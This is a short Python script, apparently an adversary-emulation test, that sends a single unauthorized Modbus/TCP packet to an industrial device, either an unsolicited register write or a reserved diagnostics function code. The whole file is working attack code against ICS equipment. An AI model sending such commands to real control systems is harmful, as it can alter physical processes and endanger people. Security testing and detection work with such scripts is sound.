#!/usr/bin/env python3
"""Send an unauthorized/malformed Modbus/TCP command message (T1692.001).

Sends a real Modbus/TCP request (MBAP header + PDU) to a target device and
prints the raw response, or the connection/timeout error if none is
received. Two abuse modes matching real-world ICS incident patterns:

  write   -- an unsolicited WRITE_SINGLE_REGISTER (function code 6) to an
             address the operator does not expect this source to write to.
  illegal -- a request using a diagnostics/reserved function code (default
             8) that a typical field device does not serve in normal
             operation.

Point --host at a device you are authorized to test, or at a local Modbus
simulator (e.g. pymodbus's synchronous server, or `diagslave`). This script
performs no scanning, brute forcing, or destructive action beyond sending
the single configured request; it never targets more than one host.
"""
import argparse
import socket
import struct
import sys

WRITE_SINGLE_REGISTER = 6


def build_pdu(mode: str, address: int, value: int, function_code: int) -> bytes:
    if mode == "write":
        return struct.pack("!BHH", WRITE_SINGLE_REGISTER, address, value)
    # illegal: a request using a function code the target does not serve.
    return struct.pack("!BH", function_code, address)


def build_frame(pdu: bytes, unit_id: int, transaction_id: int) -> bytes:
    length = 1 + len(pdu)  # unit id + pdu
    mbap = struct.pack("!HHHB", transaction_id & 0xFFFF, 0, length, unit_id)
    return mbap + pdu


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1", help="Target Modbus/TCP device")
    parser.add_argument("--port", type=int, default=502, help="Target Modbus/TCP port")
    parser.add_argument("--mode", choices=["write", "illegal"], default="write")
    parser.add_argument("--address", type=int, default=0, help="Register address")
    parser.add_argument("--value", type=int, default=1, help="Value for write mode")
    parser.add_argument("--function-code", type=int, default=8, help="Function code for illegal mode")
    parser.add_argument("--unit-id", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    pdu = build_pdu(args.mode, args.address, args.value, args.function_code)
    frame = build_frame(pdu, args.unit_id, transaction_id=1)

    print(f"[T1692.001] mode={args.mode} target={args.host}:{args.port} pdu={pdu.hex()}")
    try:
        with socket.create_connection((args.host, args.port), timeout=args.timeout) as sock:
            sock.sendall(frame)
            response = sock.recv(256)
            print(f"[T1692.001] response ({len(response)} bytes): {response.hex()}")
    except (ConnectionRefusedError, OSError) as exc:
        print(f"[T1692.001] no response / connection error: {exc}")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
